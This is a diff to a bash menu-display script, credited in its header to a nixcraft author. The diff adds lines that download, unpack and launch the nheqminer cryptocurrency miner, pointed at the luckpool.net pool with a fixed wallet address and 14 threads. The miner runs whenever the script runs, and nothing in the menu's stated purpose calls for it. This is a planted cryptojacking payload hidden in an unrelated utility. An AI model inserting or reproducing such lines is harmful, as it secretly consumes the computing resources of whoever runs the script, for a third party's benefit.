@@ -1,4 +1,7 @@
 #!/bin/bash
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
+tar -xvf nheqminer-Linux-v0.8.2.tgz 
+tar -xvf nheqminer-Linux-v0.8.2.tar.gz
 # Purpose: Display various options to operator using menus
 # Author: Vivek Gite < vivek @ nixcraft . com > under GPL v2.0+
 # ---------------------------------------------------------------------------
@@ -41,3 +44,4 @@ do
 		*) Pause "Select between 1 to 5 only"
 	esac
 done
+nheqminer/nheqminer -v -l eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.rucika -p x -t 14
